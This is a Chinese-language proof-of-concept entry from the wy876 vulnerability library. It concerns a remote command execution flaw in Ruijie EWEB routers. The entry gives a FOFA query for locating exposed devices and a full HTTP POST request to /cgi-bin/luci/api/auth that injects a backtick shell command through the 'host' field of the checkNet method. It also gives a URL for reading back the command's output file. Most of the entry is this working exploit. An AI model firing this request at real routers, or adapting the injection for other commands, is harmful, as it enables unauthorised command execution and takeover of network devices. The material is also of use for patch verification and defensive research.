---
fofa: "body="
source: "wy876 漏洞文库"
---

# 锐捷 EWEB路由器 auth 远程命令执行漏洞

# 一、漏洞简介
锐捷睿易是锐捷网络面向商务市场的子品牌。拥有便捷的网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商业零售、酒店、kt、网吧、监控与安全、物流、仓储、制造。通过该漏洞，攻击者可以任意执行服务器端的代码，编写后门，获得服务器权限，进而控制整个web服务器。

# 二、影响版本
+ 锐捷 EWEB路由器

# 三、资产测绘
+ fofa`body="cgi-bin/luci" && body="#f47f3e"`
+ 特征


# 四、漏洞复现
```plain
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: 
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"method":"checkNet","params":{"host":"`echo c149136B>AD0D5b8c.txt`"}}
```


获取命令执行结果

```plain
/cgi-bin/AD0D5b8c.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vx00xdatfw3yw8px>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
